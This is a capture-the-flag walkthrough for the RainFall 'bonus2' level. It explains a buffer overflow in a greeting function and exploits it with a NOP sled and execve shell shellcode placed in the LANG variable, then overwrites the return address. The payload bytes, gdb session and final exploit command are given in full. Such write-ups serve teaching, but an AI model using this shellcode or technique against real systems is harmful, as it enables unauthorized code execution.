The program requires 2 arguments for input

```
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 1
bonus2@RainFall:~$ ./bonus2 1 2
Hello 1
```

Program allocate memory for buffer  

```
memset(buffer, 0, 72);
```

And copy 40 characters from argv[1] to buffer

```
strncpy(buffer, argv[1], 40);
```

Copy 32 characters more right after the first 40 characters from argv[2]

```
strncpy(&buffer[40], argv[2], 32);
```

Also there is checking of LANG env

```
char* env = getenv("LANG");
```

Depending on the value of the variable program sets value of global variable ```language```

```
if (env == "fi") { 
    language = 1 
} else if (env == "nl") {
    language = 2 
}
```

In function greetuser our buffer concatenates with one of 'greeting' which is also 
depends on language value

```
if (lang == 1) {
    strcpy(buffer, "Hyvää päivää ");
} else if (lang == 2) {
    strcpy(buffer, "Goedemiddag! ");
} else if (lang == 0) {
    strcpy(buffer, "Hello ");
}

strcat(buffer, name)
```

We can try to calculate the offset to the eip register

With language equal ```fi``` offset is 18 and with ```nl``` offset is 23


Prepare payload for LANG env

```LANG=["fi" || "nl"]+[noopInstruction]+[shellCode]```

```
export LANG=$(python -c 'print("fi" + "\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

```
break main
run $(python -c 'print "Q"*40') test
x/30s *((char **)environ) 
```

```
...
0xbffffe58:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xbfffff20:	 "\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
...
```
Get 0xbffffe58 and add 2 bytes to skip length of "fi" or "li"
0xbffffe58 + 2 = 0xbffffe5a -> \x5a\xfe\xff\xbf

Payload for program

```
./bonus2 $(python -c 'print "Q" * 40') $(python -c 'print "Q" * 18 + "\x5a\xfe\xff\xbf"')
```